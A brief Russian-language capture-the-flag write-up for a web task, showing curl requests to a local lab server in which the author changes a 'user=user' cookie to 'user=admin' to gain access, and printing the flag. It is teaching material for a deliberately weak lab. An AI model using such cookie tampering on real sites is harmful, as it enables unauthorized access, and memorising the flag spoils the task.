## Таск: Стань админом
_To become an admin one should feed another with cookies. `http://<HOST>:33000`_

## Writeup:

Даже без знания английского можно прочитать, что таск связан с cookie-файлами. Cookie файлы это те файлы, который хранятся на компьютере клиента и передаются с каждым http запросом. Сервер может попросить клиента поменять эти файлы. Куки нужны в том числе и для авторизации и поддержания сессии клиента.  

Смотрим какие куки возвращает сервер при запросе /index:

```
* Rebuilt URL to: localhost:33000/
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 33000 (#0)
> GET / HTTP/1.1
> Host: localhost:33000
> User-Agent: curl/7.55.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Mon, 04 Nov 2019 14:03:16 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.2.24
< Set-Cookie: user=user
< Vary: Accept-Encoding
< Content-Length: 132
< Content-Type: text/html; charset=UTF-8
<
<!doctype html>
<html>
<head>
    <title>Security system</title>
</head>
<body>
    <h1>Access Denied </h1>
</body>
</html>
* Connection #0 to host localhost left intact
```

Видим, что сервер ставит куку user в user: ```Set-Cookie: user=user```. Название таска и это наводит на мысль, что нужно поставить user в admin. Каждый жаждит стать админом, потому что обычно у него есть полный доступ.
Пробуем и получаем флаг.

```
~ > curl -v localhost:33000 --cookie user=admin
* Rebuilt URL to: localhost:33000/
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 33000 (#0)
> GET / HTTP/1.1
> Host: localhost:33000
> User-Agent: curl/7.55.1
> Accept: */*
> Cookie: user=admin
>
< HTTP/1.1 200 OK
< Date: Mon, 04 Nov 2019 13:59:28 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.2.24
< Vary: Accept-Encoding
< Content-Length: 178
< Content-Type: text/html; charset=UTF-8
< 
<!doctype html>
<html>
<head>
    <title>Security system</title>
</head>
<body>
    <h1>Access Granted. The flag is flag{repl4cing_co0kies_is_3asy}</h1>
</body>
</html>```

